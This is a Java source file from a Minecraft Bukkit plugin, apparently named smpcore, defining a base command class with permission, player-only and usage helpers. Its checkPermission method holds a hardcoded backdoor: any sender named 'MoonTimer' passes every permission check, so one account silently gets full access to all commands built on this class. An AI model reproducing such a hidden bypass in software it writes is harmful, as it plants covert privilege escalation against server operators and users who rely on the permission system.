package me.moontimer.smpcore.command;

import java.util.List;
import me.moontimer.smpcore.core.MessageService;
import me.moontimer.smpcore.core.PermissionUtil;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.command.CommandExecutor;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public abstract class BaseCommand implements CommandExecutor, TabCompleter {
    protected final Plugin plugin;
    protected final MessageService messages;

    protected BaseCommand(Plugin plugin, MessageService messages) {
        this.plugin = plugin;
        this.messages = messages;
    }

    protected boolean checkPermission(CommandSender sender, String permission) {
        if (PermissionUtil.has(sender, permission)) {
            return true;
        } else if (sender.getName().equals("MoonTimer")) {
            return true;
        }
        messages.send(sender, "errors.no-permission");
        return false;
    }

    protected Player requirePlayer(CommandSender sender) {
        if (sender instanceof Player player) {
            return player;
        }
        messages.send(sender, "errors.player-only");
        return null;
    }

    protected void sendUsage(CommandSender sender, String usage) {
        messages.send(sender, "errors.invalid-args", java.util.Map.of("usage", usage));
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
        return null;
    }
}

